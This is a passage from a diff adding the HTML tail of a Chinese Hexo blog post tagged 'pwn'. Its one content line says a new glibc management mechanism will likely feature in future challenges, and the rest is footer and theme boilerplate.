+<li>目前，该机制的考察较少，但是作为最新的glibc的管理机制，肯定是之后的出题的热点。有关该机制的更多学习，可以参见glibc新版本的源码。</li>
+</ul>
+
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> 打赏
+            </a>
+        </div>
+        
+        <div class="post-tags">标签：
+            
+            <a href="../../../../tags/pwn/">pwn</a>
+            
+        </div>
+        
+    </article>
+    
+    <p>本文代表个人观点，内容仅供参考。若有不恰当之处，望不吝赐教！</p>
+    
+    
+</div>
+<script src="../../../../js/busuanzi.pure.mini.js"></script>
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner">
+        <p>
+            <a href="/about" title="关于本站">关于本站</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="help">急救中心</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/app" title="App下载">App下载</a>
+        </p>
+        <p>
+            本站点采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>，已建立<a href="/timeline" id="siteBuildingTime"></a>天<br>
+            ©2017 基于<a href="http://hexo.io" target="_blank">Hexo</a>搭建
+            ，主题&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank">JSimple</a>
+            ，作者<a href="https://www.tangkunyin.com" target="_blank">唐先森</a>
+            ，Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
+        </p>
+        
+
+    </div>
+</footer>
+<script src="../../../../js/InsightSearch.js"></script>
+<script src="../../../../js/SimpleCore.js"></script>
+
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        SimpleCore.init({
+            buildingTime: '11/22/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+        });
+    });
+</script>
+</body>
+</html>
